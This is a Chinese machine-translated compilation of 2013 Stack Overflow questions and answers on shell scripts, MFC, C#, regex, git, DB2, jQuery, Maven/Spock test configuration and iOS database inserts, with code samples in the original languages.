看起来您可能想尝试[DBxtra](http://dbxtra.com)，它将 Excel 文件作为数据源，让您针对它们创建 SQL 查询，并可以将结果返回到 Excel，无论是静态的还是动态的，甚至它还可以创建带有图表的数据透视表。

# shell - 如何编写一个 shell 脚本将多个文件从具有相同名称的不同子目录移动到不同位置？

> ID：15526465
> 
> 赞同：0
> 
> 时间：2013-03-20T14:32:35.257
> 
> 标签：shell

我有这样的文件结构

```
/home/code/AXP1/file.dat
/home/code/AXP2/file.dat
/home/code/AXP3/file.dat
/home/code/AXP4/file.dat 
```

我想将`.dat`子目录`APX1`, `APX2`, `APX3`,`APX4`等下的所有扩展名文件移动到特定位置，例如`/home/BOX`名称为`file1.dat`, `file2.dat`, `file3.dat`,`file4.dat`等。

那么，您能否介绍一下如何编写 Linux shell 脚本来完成上述任务。

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:20:23.297

那这个呢？

```
mv /home/code/APX[1-4]/file.dat /home/BOX/ 
```

如果要保留它们所在文件夹的编号，可以执行以下操作：

```
for i in {1..4}
do
  mv /home/code/APX$i/file.dat /home/BOX/file$i.dat
done 
```

如果您有 4 个以上的文件夹，比如说`n`，将 4 更改为`n`.

# mfc - TabView 中的拆分器

> ID：15526467
> 
> 赞同：0
> 
> 时间：2013-03-20T14:32:39.457
> 
> 标签：mfc, csplitterwnd

我知道一个文档可以有多个视图这些可以通过子框架类中的拆分器或通过 CTabView 但我想要多个选项卡，其中选项卡包含多个带有拆分器的视图？

这种组合可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T02:28:09.537

CTabCtrl::InsertItem 可以在 tabctrl 中将视图作为新选项卡插入。

```
CWnd* CObjectDlg::AddView(LPCTSTR lpszLabel, CRuntimeClass *pViewClass) 
```

{

```
CCreateContext context;
context.m_pCurrentDoc       = NULL;
context.m_pCurrentFrame     = GetParentFrame();
context.m_pLastView         = NULL;
context.m_pNewDocTemplate   = NULL;
context.m_pNewViewClass     = pViewClass;

CWnd* pWnd;
TRY {
    pWnd = (CWnd*)pViewClass->CreateObject();
    if (pWnd == NULL){
        AfxThrowMemoryException();
    }
}
CATCH_ALL(e) {
    TRACE0(_T("Out of memory creating a view.\n"));
    return NULL;
}
END_CATCH_ALL

ASSERT_KINDOF(CWnd, pWnd);
ASSERT(pWnd->m_hWnd == NULL);       // not yet created

DWORD dwStyle = AFX_WS_DEFAULT_VIEW;
CRect rect;

// Create with the right size and position
if (!pWnd->Create(NULL, NULL, dwStyle, rect, &m_ObjectTab, 0, &context)) {
    TRACE0(_T("Warning: couldn't create client pane for view.\n"));
    // pWnd will be cleaned up by PostNcDestroy
    return NULL;
}
int nViews = m_ObjectTab.GetItemCount();
if (nViews != 0) {
    pWnd->EnableWindow(FALSE);
    pWnd->ShowWindow(SW_HIDE);
}
else{
    pWnd->EnableWindow(TRUE);
    pWnd->ShowWindow(SW_SHOW);
    m_pActiveView = (CView*)pWnd;
}

TC_ITEM tci;
tci.mask = TCIF_TEXT | TCIF_IMAGE | TCIF_PARAM;
tci.pszText = (LPTSTR)(LPCTSTR)lpszLabel;
tci.iImage = nViews;
tci.lParam = (DWORD)pWnd;
m_ObjectTab.InsertItem(nViews, &tci);
CRect rcChild;
m_ObjectTab.GetClientRect(&rcChild);
rcChild.top += 2;
rcChild.left += 2;
rcChild.bottom -= 23;
rcChild.right -= 2;
pWnd->MoveWindow(rcChild);
m_WndArray.Add(pWnd);
return pWnd; 
```

}

# c# - C#Designed 无法识别自定义用户控件中的自定义事件

> ID：15526469
> 
> 赞同：6
> 
> 时间：2013-03-20T14:32:44.930
> 
> 标签：c#, visual-studio-2012, designer

我在使用 VS2012 设计器时遇到问题。我有一个我设计的用户控件，其中是一个文本框（除其他外），用户用于输入 IPv4、IPv6 或 DNS。我需要验证该文本是否有效（TextChanged 事件）报告回主程序。考虑以下代码：

```
private bool addressError;

public EventHandler ErrorChanged;

public bool Error
{
    get
    {
       return addressError;
    }
    set
    {
        if (this.Error != value)
        { 
            addressError = value;
            OnErrorChanged(this, EventArgs.Empty);
        }
    }
}

protected virtual void OnErrorChanged(object sender, EventArgs e)
{
    if (ErrorChanged != null)
    {
        ErrorChanged(sender, e);
    }
} 
```

然后我将事件处理程序添加到主程序设计器（控件名称为“Com”）：

```
this.Com.ErrorChanged += new System.EventHandler(this.Com_ErrorChanged); 
```

我遇到的问题是，尽管代码完全按照我的意愿工作，但设计者认为没有`ErrorChanged`事件。它报告的确切消息是

> *“‘ModbusCom.Communications’类型没有名为‘ErrorChanged’的事件。”*

我可以忽略该错误，并且设计器可以正常显示表单。我可以运行程序，一切都很好，但是不得不一直告诉它忽略这个问题有点烦人。我能做些什么来解决这个问题吗？帮助表示赞赏！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-20T14:35:00.603

您没有将其声明为事件

改变：

```
public EventHandler ErrorChanged; 
```

进入：

```
public event EventHandler ErrorChanged; 
```

# regex - 删除换行符，除非前面有

> ID：15526473
> 
> 赞同：2
> 
> 时间：2013-03-20T14:32:57.953
> 
> 标签：regex, notepad++

我需要从一些文本中删除额外的换行符。我只需要保留句号/句点字符前面的换行符`.`。

在下面的示例文本中，我只需要保留 2 个换行符：一个 after`...arcu rhoncus.`和一个 after `...ac in est.`。

```
Donec viverra mi quis quam pulvinar at malesuada arcu rhoncus.
Cum sociis natoque penatibus et magnis dis parturient montes, nascetur
ridiculus mus. In rutrum accumsan ultricies. Mauris vitae nisi at sem facilisis
semper ac in est.
Vivamus fermentum semper porta. Nunc diam velit, adipiscing ut tristique
vitae, sagittis vel odio. Maecenas convallis ullamcorper ultricies. Curabitur
ornare, ligula semper consectetur sagittis, nisi diam iaculis velit, id 
fringilla sem nunc vel mi. 
```

我为此使用记事本++。

我可以将我想要保留的内容与以下内容相匹配，但我不确定如何制作整个解决方案。

```
[.]$ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:43:26.603

就像[在此评论中](https://stackoverflow.com/questions/15526473/remove-newlines-unless-preceeded-by#comment21993049_15526473)建议的那样，负面的后视效果很好。在 Notepad++ 中搜索此正则表达式并替换为单个空格：

```
(?<!\.)\s*\r\n\s* 
```

如果你只有 have`\n`而不是`\r\n`那么只需删除`\r`.

请注意，使用`\r?`Notepad++ 时似乎匹配非贪婪，因此`\r`不会被删除。

Notepad++ v6.1.5 (UNICODE) 的结果：

```
Donec viverra mi quis quam pulvinar at malesuada arcu rhoncus.
Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. In rutrum accumsan ultricies. Mauris vitae nisi at sem facilisis semper ac in est.
Vivamus fermentum semper porta. Nunc diam velit, adipiscing ut tristique vitae, sagittis vel odio. Maecenas convallis ullamcorper ultricies. Curabitur ornare, ligula semper consectetur sagittis, nisi diam iaculis velit, id fringilla sem nunc vel mi. 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:41:25.580

您需要使用负后视并用空格替换：

```
(?<!\.)\r\n 
```

对于不知道此构造的人（或者如果不支持后视），另一种选择是首先将所有出现的 替换为`\.\r\n`不同的`<rnt>`字符串，然后删除所有换行符，然后再次替换`<rnt>`为`\.\r\n`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T14:44:21.293

这是一种非后视方法：

搜索：

```
([^.])(\r\n)+ 
```

并替换为：

```
\1 
```

where`\1`后面是一个空格。

请注意，`+`需要连续匹配多个换行符。否则，并非所有换行符都会匹配。

# winforms - EF 5 Code First Windows 窗体应用程序：如何处理数据验证？

> ID：15526482
> 
> 赞同：1
> 
> 时间：2013-03-20T14:33:23.037
> 
> 标签：winforms, ef-code-first, entity-framework-5, validation

我试图找出在 Windows 窗体（代码优先）应用程序中验证用户输入数据的最佳方法。

我知道如何添加数据注释以及如何在 MVC 应用程序中使用它们，但我不知道如何在 Windows 窗体中使用它们。

到目前为止，我发现的唯一（丑陋）方法是处理文本框离开和类似事件，但必须有更好的方法。

我只是在网络上找不到任何东西：每次我找到对某些网络场景的引用时，因为 Code First 仅用于网络应用程序（这可能是事实）。

# python - 带有 kbhit 的 Python 套接字线程

> ID：15526484
> 
> 赞同：1
> 
> 时间：2013-03-20T14:33:25.303
> 
> 标签：python, multithreading, sockets, keypress

我已经不知道 python 中的 msvcrt.kbhit() 如何在我单击需要按下的指定键后立即打印出数据。看起来while循环需要再次循环才能打印出我想要的输出。有人可以帮帮我吗。这是我的代码：

```
def run(self):
    global state
    print "\nClient connection received!\n"
    self.channel.send("Status: Server connection received")
    while 1:
        ctr = 1
        while 1:
            self.clientmess = self.channel.recv(Buffer)
            if msvcrt.kbhit():
                if msvcrt.getch() == 's':
                    print "stop"
                    break
    #the codes belo is what i will want for self.clientmess will be so its not necessary I think to put 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:03:27.153

大多数情况下，您的程序会阻塞`recv`调用，因此在收到一些数据之前，它不会执行`kbhit`+ `getch`。如果您需要立即处理键盘输入，您可能需要使套接字成为非阻塞并在循环中轮询套接字和键盘，并在它们出现时处理来自它们的数据。

# git - 如何在 Git 中确定一个cherry-pick 的提交者？

> ID：15526488
> 
> 赞同：16
> 
> 时间：2013-03-20T14:33:29.237
> 
> 标签：git, merge, cherry-pick, git-cherry-pick

在 Git 中，`cherry-pick`至少在没有冲突的情况下保留原始提交的作者、时间戳等。但是有没有办法确定哪个用户执行了将提交带到新分支的cherry-pick？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-20T14:37:46.190

作者将从原始提交中挑选出来，但提交者（显示为`git log --format=full`）将是挑选樱桃的人。这个提交者字段是不安全的，因为樱桃选择提交的创建最终是在樱桃选择者的控制之下。跟踪提交创建者的唯一可靠方法，在这种情况下是樱桃挑选的发起者，是在提交上签字。

一种更简单的方法是仔细记录 git 服务器上的推送。推送引入的提交表明谁进行了挑选，或者更准确地说，是谁发布了它。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-03-20T14:40:38.747

使用导致以下结果的任何一个`--pretty=full`参数：`git log`

```
git log -1 --pretty=full
commit 123abc
Author: Author Name
Commit: Commiter Name
Date: Wed Mar 20 09:43:20

Commmit Message 
```

或者，如果您只对产生的提交者的名称感兴趣`--format="%cN"`：

```
git log -1 --format="%cN"
Commiter Name 
```

有关更多信息，请参阅[git-log(1)](https://www.kernel.org/pub/software/scm/git/docs/git-log.html)。

# db2 - 如何在 Windows 7 64 位上为 Cognos BI Framework Manager 配置 DB2 CLI 驱动程序？

> ID：15526489
> 
> 赞同：0
> 
> 时间：2013-03-20T14:33:31.250
> 
> 标签：db2, cognos-bi

我正在为 Cognos Business Intelligence (v10.1) 使用 Framework Manager（数据建模工具）。

我在 AIX 机器上成功设置了 DB2 (v9.7) 和 Cognos BI。在我的 Windows 机器上，我想对在 AIX 上与 DB2 连接的模型进行一些更改。

我已将 E:\softwares\v9.7fp7_ntx64_odbc_cli\clidriver\bin 添加到我的 Path 环境变量中。此路径包含**db2cli.dll**。这解决了我的错误`UDA-SQL-0569 Unable to load the driver manager library ( db2cli.dll ).`

现在我收到以下错误。

> QE-DEF-0285 登录失败。QE-DEF-0325 登录失败，原因如下：RQP-DEF-0068 在多数据库附加到 1 个数据库期间无法连接到至少一个数据库：CampaignDS UDA-SQL-0570 无法解析 ODBC函数（ sqledosd_api ）。

我还需要做什么才能成功连接我的 Framework Manager？任何帮助appriciated。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T15:45:57.870

我认为您应该安装 IBM Data Server 客户端以连接到 DB2 服务器/数据库。

我不确定仅仅复制一个 dll 是否足以允许通过 ODBC 进行 DB2 连接。

最好是配置客户端，然后配置它：

*   对实例进行编目
*   对数据库进行编目
*   配置 ODBC 源

从此链接下载 DB2（客户端）的驱动程序： [http ://www-01.ibm.com/support/docview.wss?uid=swg27016878](http://www-01.ibm.com/support/docview.wss?uid=swg27016878)

# jquery - 悬停不适用于 jQuery 1.9

> ID：15526490
> 
> 赞同：0
> 
> 时间：2013-03-20T14:33:32.027
> 
> 标签：jquery

我有以下代码

```
HTML:

<div id="test">
    <p id="hello">HELLO</p>
    <p id="no-hello">NO HELLO</p>
</div> 
```

**jQuery：**

```
 $('#test').click(function() {
       alert($('#hello').is(':hover'));
        if ($('#hello').is(':hover')) {
            alert('hello');
        }
    }); 
```

我一直在使用 jQuery 1.6，它运行良好。但是现在由于某种原因，使用了 1.9，这已经停止工作。我尝试在网上寻找解决方案，但没有得到任何提示。

谢谢大家。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:46:11.340

如果您在这种情况下需要点击区域的 id，您可以尝试：

```
$('#test').click(function(event) {
   alert(event.target.id);
    if (event.target.id == "hello") {
        alert('hello');
    }
}); 
```

[样本](http://jsfiddle.net/HynAU/)

但是您提供的方法在 jQuery 1.9+ 上不受支持

请参阅您的方法的一种替代方法：

```
$('#test').click(function() {
   alert($('#hello:hover').length ==1);
    if ($('#hello:hover').length) {
        alert('hello');
    }
}); 
```

[样品 2](http://jsfiddle.net/HynAU/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:51:17.590

正如 AV 所指出的，您的方法在 jQuery 1.9+ 中不起作用。

但是，您为什么要这样做呢？

为什么不简单地将两个不同的点击事件分配给`hello`和`no-hello`？

```
function doOnBoth() { ... };

$("#hello").click(function () {
    doOnBoth();
    alert('hello');
});

$("#no-hello").click(function () {
    doOnBoth();
    alert("not hello");
}); 
```

或者，您可以为这两个元素分配类，然后为该类分配一个点击事件，并为 ID 分配单独的点击事件。

问题是，**可以在不先触发悬停的情况下触发点击**。

除非我没有得到你想要达到的目标......

# c# - 为什么我的参考的复制本地属性被禁用？

> ID：15526491
> 
> 赞同：65
> 
> 时间：2013-03-20T14:33:32.960
> 
> 标签：c#, visual-studio, dll

我正在尝试将引用的 DLL 设置为显式复制到我的本地文件夹，但是当我转到此引用的属性时，该`Copy Local`属性显示为灰色/禁用。

![禁用复制本地属性](../Images/ef32656f2be0c85a2d73059a985fcdbc.png)

通常我的 VB.NET 项目`My Project`在项目名称正下方有一个项目，我可以双击 >> 引用并设置`Copy Local`属性，但是我的 C# 控制台应用程序似乎没有这个。

![我的项目参考](../Images/ece1460b6b4d2abb9954d6af6ea1844f.png)

我是否可能错误地配置了我的项目？对此的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：96
> 
> 时间：2013-03-20T14:36:55.457

[直接来自此 SO 帖子：](https://stackoverflow.com/questions/3635716/visual-studio-copy-dll-refrences-to-output-folder)

> 您对 Hans 回答的评论表明这是一个 COM 程序集并且您正在使用 Visual Studio 2010。
> 
> 这意味着程序集引用很可能是在“嵌入互操作类型”设置为 true 的情况下添加的。这具有将 COM 程序集链接到您的二进制文件的效果，无需完全部署它。以下链接有更详细的解释•<a href="http://msdn.microsoft.com/en-us/library/dd409610.aspx" rel="noreferrer">http://msdn.microsoft.com/ en-us/library/dd409610.aspx 如果您确实想要部署它，则需要执行以下操作 •单击“参考”选项卡中的参考 •按 F4 以显示属性网格 •将“嵌入互操作类型”设置为假（这将取消本地复制） •将“本地复制”设置为真

如果要复制本地，则必须为程序集设置`Embed Interop Types`为`False`，在您的情况下，`Microsoft.Office.Interop.Excel`. 嵌入互操作类型使 COM 程序集的部署更容易，因为它将程序集嵌入到您的程序集中，无需使用应用程序部署互操作程序集。

# regex - R 中的正则表达式：带有 {} 的模式重复

> ID：15526497
> 
> 赞同：1
> 
> 时间：2013-03-20T14:33:44.563
> 
> 标签：regex, r

我在使用 R 中的正则表达式时遇到问题。目标是在 R 中解析 Markdown/reST/knitr 报告文本文件以删除我自己的自定义注释。这些评论以下列形式呈现：

```
Some sentence is about something <find a citation to this>. 
```

由于 Markdown 使用 <> 作为 HTML 标签，我需要删除这些注释（使用我的自定义函数）以避免混淆。在我这样做之后，句子采用以下形式：

```
Some sentence is about something . 
```

注意最后一个单词和点之间的空格。删除它很容易，但是文本可能包含包含 R 代码 (knitr) 的 reST 注释，其中以 开头`..`：

```
.. {r chunk-name}
.. some R code 
.. .. 
```

所以基本上我需要替换“。” 在前一种情况下，但不是在后一种情况下。我虽然可以使用 R 正则表达式原子的重复修饰符来实现这一点：

```
gsub(pattern=" \\.{1}",replacement=".",x="Something ..")
[1] "Something.." 
```

我期待这个表达式会匹配一个空格，后跟一个（但不是更多）点。但是，无论是一个点还是两个点，字符串都会被替换。我是一个真正的新手，所以可能遗漏了一些明显的东西。即便如此，任何帮助将不胜感激。

问候， 马克西姆

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:43:44.103

一旦模式匹配，匹配就会发生。没有任何期待可以确保该模式不会重复出现。我不确定它是否足够通用，但是在提供的单个测试用例中使用带有否定运算符的字符类

```
> gsub(pattern=" \\.[^.]| \\.$",replacement=".",x="Something .")
[1] "Something."
> gsub(pattern=" \\.[^.]| \\.$",replacement=".",x="Something ..")
[1] "Something .." 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:44:46.043

您可以删除从*最后一个空格*到 the 的所有内容，然后在字符串末尾`.`粘贴 a ，不是吗？`.`

```
# anything followed by any amount of space followed 
# by < followed by anything until the end of the sentence
paste0(gsub("(.*)[ ].*<.*$", "\\1", tt), ".")
# [1] "Some sentence is about something." 
```

也就是说，你[**真的应该阅读这个**](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags)。

或者，如果标记出现在句子的中间，而您只想删除它们以及它们周围的空格，那么：

```
# remove everything within <...> including < and > 
# and any spaces surrounding them
gsub("[ ]*<.*?>[ ]*", "", tt)
# [1] "Some sentence is about something."

# example:
tt <- ".. some sentences are wrong <bla bla>. But some are <bla bla> right."
gsub("[ ]*<.*?>[ ]*", "", tt)
# [1] ".. some sentences are wrong. But some are right." 
```

`.*>`注意和之间的区别`.*?>`。第一个是“贪婪的”，因为它将匹配所有字符，直到最后一个>。而第二个将在第一个匹配后停止，这在此处是可取的，并且您希望删除每个匹配项。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-21T17:29:31.293

您可以使用 Perl 正则表达式中的否定前瞻模式来完成您想要的操作。这基本上说匹配模式，但前提是不遵循该模式。一个简单的例子：

```
> gsub(pattern=" \\.(?!\\.)",replacement=".",x="Something .", perl=TRUE)
[1] "Something."
> gsub(pattern=" \\.(?!\\.)",replacement=".",x="Something ..", perl=TRUE)
[1] "Something .." 
```

# c# - 将字符串转换为流

> ID：15526507
> 
> 赞同：0
> 
> 时间：2013-03-20T14:34:27.057
> 
> 标签：c#, asp.net, string, stream

我正在尝试使用 Controller.File 方法将大型 .csv 文件作为操作结果返回，并且它要求我使用 a`byte[]`或 Stream。

使用`GetBytes`方法时，我得到一个`OutOfMemoryException`.

有没有办法做到这一点而不试图同时把它全部放在内存中？

这是我目前使用的回报：

```
string csv = data.ToCsv();
return File(Encoding.UTF8.GetBytes(csv), "text/csv", "ClusterFMCacheExport.csv"); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:48:20.633

你试过这个吗？

```
using(MemoryStream stream = new MemoryStream())
using(StreamWriter writer = new StreamWriter(stream))
{
    writer.Write(s);
    writer.Flush();
    stream.Position = 0;
    return File(stream, "text/csv", "ClusterFMCacheExport.csv");
} 
```

如果您的数据真的*那么*大，这可能无济于事。如果您生成一个*非常*大的 csv 文件，我建议您重新编写`ToCsv()`generate a`stream`而不是 a `string`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:44:01.107

有一段时间没有使用 ASP.NET，但不应该这样工作（假设该文件已经在磁盘上）：

```
FileStream fs = ... // stream over your csv file, however you get it
return File(fs, "application/csv", "file.csv"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:49:28.133

不会：

```
Response.AddHeader("content-disposition", "attachment;filename=file.csv");
return Content(csv, "application/csv"); 
```

avoid the conversion? It might just kick it down the road though, only for the OOME to re-emerge elsewhere.

# maven - JUnit + Maven + 并行测试执行错误

> ID：15526510
> 
> 赞同：9
> 
> 时间：2013-03-20T14:34:41.840
> 
> 标签：maven, groovy, junit, parallel-processing, spock

在使用 JUnit、Groovy、Spock 和 Maven 时，我在并行执行 JUnit 测试时遇到问题。执行它们时，我在测试成功通过后得到以下信息：

```
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 18.362s
[INFO] Finished at: Wed Mar 20 15:14:25 CET 2013
[INFO] Final Memory: 16M/221M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.14:test (default-test) on project spock-webdriver: ExecutionException; nested exception is java.util.concurrent.ExecutionException: java.lang.RuntimeException: There was an error in the forked process
[ERROR] java.lang.NoSuchMethodError: org.apache.maven.surefire.common.junit4.JUnit4RunListener.rethrowAnyTestMechanismFailures(Lorg/junit/runner/Result;)V
[ERROR] at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:129)
[ERROR] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
[ERROR] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
[ERROR] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
[ERROR] at java.lang.reflect.Method.invoke(Method.java:601)
[ERROR] at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray2(ReflectionUtils.java:208)
[ERROR] at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:158)
[ERROR] at org.apache.maven.surefire.booter.ProviderFactory.invokeProvider(ProviderFactory.java:86)
[ERROR] at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153)
[ERROR] at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:95)
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException 
```

在我的 pom.xml 中启用强制使用 Junit 47 Provider 时，我得到了：

```
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 3.271s
[INFO] Finished at: Wed Mar 20 15:31:42 CET 2013
[INFO] Final Memory: 17M/178M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.14:test (default-test) on project spock-webdriver: ExecutionException; nested exception is java.util.concurrent.ExecutionException: java.lang.RuntimeException: There was an error in the forked process
[ERROR] java.lang.NoSuchMethodError: org.apache.maven.surefire.util.TestsToRun.size()I
[ERROR] at org.apache.maven.surefire.junitcore.JUnitCoreProvider.invoke(JUnitCoreProvider.java:123)
[ERROR] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
[ERROR] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
[ERROR] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
[ERROR] at java.lang.reflect.Method.invoke(Method.java:601)
[ERROR] at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray2(ReflectionUtils.java:208)
[ERROR] at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:158)
[ERROR] at org.apache.maven.surefire.booter.ProviderFactory.invokeProvider(ProviderFactory.java:86)
[ERROR] at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153)
[ERROR] at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:95)
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException 
```

pom.xml 看起来像这样

```
<dependencies>
        <dependency>
            <groupId>org.seleniumhq.selenium</groupId>
            <artifactId>selenium-java</artifactId>
            <version>2.31.0</version>
            <scope>compile</scope>
        </dependency>

        <!--If this is commented out parallel testing is not working!!! When in testexecution itself is not working  -->
        <dependency>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-surefire-plugin</artifactId>
            <version>2.14</version>
        </dependency>

        <dependency>
            <groupId>org.spockframework</groupId>
            <artifactId>spock-maven</artifactId>
            <version>0.7-groovy-2.0</version>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.codehaus.gmaven</groupId>
                <artifactId>gmaven-plugin</artifactId>
                <version>1.3</version>
                <configuration>
                    <providerSelection>1.7</providerSelection>
                    <source/>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <goal>testCompile</goal>
                        </goals>
                    </execution>
                </executions>
                <dependencies>
                    <dependency>
                        <groupId>org.codehaus.gmaven.runtime</groupId>
                        <artifactId>gmaven-runtime-1.7</artifactId>
                        <version>1.3</version>
                        <exclusions>
                            <exclusion>
                                <groupId>org.codehaus.groovy</groupId>
                                <artifactId>groovy-all</artifactId>
                            </exclusion>
                        </exclusions>
                    </dependency>
                    <dependency>
                        <groupId>org.codehaus.groovy</groupId>
                        <artifactId>groovy-all</artifactId>
                        <version>2.0.6</version>
                    </dependency>
                </dependencies>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-surefire-plugin</artifactId>
                <version>2.14</version>
                <dependencies>
                </dependencies>
                <configuration>
                    <includes>
                        <include>**/*Test.java</include>
                    </includes>
                    <!-- Surefire 2.14+ configuration for parallelization -->
                    <forkCount>5</forkCount>
                    <reuseForks>false</reuseForks>
                </configuration>
            </plugin>
        </plugins>
    </build> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-07-22T00:08:06.427

这是一个旧线程，但对于可能遇到此问题的其他人...此错误是由于与 surefire 插件依赖项和 spock 0.7.0 依赖项不一致而引起的。Spock 使用 surefire-junit47，版本 2.11。此类/方法 JUnit4RunListener.rethrowAnyTestMechanismFailures 在该万无一失的版本中不存在。解决方案是从 spock 依赖项定义中排除肯定版本，如下所示：

```
<dependency>
    <groupId>org.spockframework</groupId>
    <artifactId>spock-maven</artifactId>
    <version>0.7-groovy-2.0</version>
    <exclusions>
        <exclusion>  <!-- exclude so we can pick up surefire-junit4 2.17 version for failsafe integration tests  -->
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit47</artifactId>
        </exclusion>
    </exclusions>
</dependency> 
```

现在，它将使用您定义的surefire版本，为了完整起见，这是我使用的surefire依赖项：

```
<dependency>
    <groupId>org.apache.maven.surefire</groupId>
    <artifactId>surefire-junit4</artifactId>
    <version>2.17</version>
</dependency> 
```

然后是 surefire 插件定义，它允许单元测试和集成测试分开触发（这部分更多是关于让单元测试、集成测试、spock、maven 和 groovy 发挥得更好）。

```
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>2.17</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit4</artifactId>
            <version>2.17</version>
        </dependency>
    </dependencies>
    <configuration>
        <forkCount>0</forkCount>
        <includes>
            <include>%regex[.*Test.*]</include>
        </includes>
        <excludes>
            <exclude>%regex[.*IntegrationTest.*]</exclude>
        </excludes>
    </configuration>
</plugin>

<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-failsafe-plugin</artifactId>
    <version>2.17</version>
    <configuration>
        <includes>
            <include>%regex[.*IntegrationTest.*]</include>
        </includes>
    </configuration>
    <executions>
        <execution>
            <id>failsafe-integration-tests</id>
            <goals>
                <goal>integration-test</goal>
            </goals>
        </execution>
    </executions>
</plugin> 
```

现在，单元测试将根据测试目标触发，集成测试可以根据需要独立启动，如下所示： mvn failsafe:integration-test

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-07-11T07:17:28.550

尝试使用2.9或以上版本

```
<groupId>org.apache.maven.plugins</groupId>
<artifactId>maven-surefire-plugin</artifactId>
<version>2.9</version> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-13T19:03:20.610

我不确定这是否相关，但是当我在 Maven 中运行 Grails Spock 测试时遇到了“分叉进程中出现错误”错误。原来我的文件名中缺少一个“s”：

MyCoolTest.groovy => MyCoolTests.groovy

# iphone - 无法在 iphone 的数据库中插入数组值

> ID：15526511
> 
> 赞同：0
> 
> 时间：2013-03-20T14:34:45.023
> 
> 标签：iphone, ios

我是电话编程的新手。我想将数组计数和数组 objectAtindex 值存储在数据库中。但它不存储你能告诉我如何存储它

```
 NSLog(@"%@",[tapCollection1 objectAtIndex:i]);
 NSLog(@"%i",[array11 count]);

NSString *insertSQL = [NSString stringWithFormat: @"insert into Taukyblauky(taukyid,blaukyid) values (\"%\",\"%i\")",[tapCollection1 objectAtIndex:i],[array11 count]]; 
```

插入 [tapCollection1 objectAtIndex:i] 和 [array11 count] 的正确方法是什么

```
 Inside that  [tapCollection1 objectAtIndex:i] it contain some value like this 3.
 Inside that [array11 count] it contain some value like this 2. 
```

在数据库中插入 objectAtindex 值和数组计数值的正确方法是什么。谢谢阿斯拉姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:41:24.780

不，CoreData 是一个 ORM。您不会写出查询（尤其是插入）。您应该可以在上下文中调用 save 。

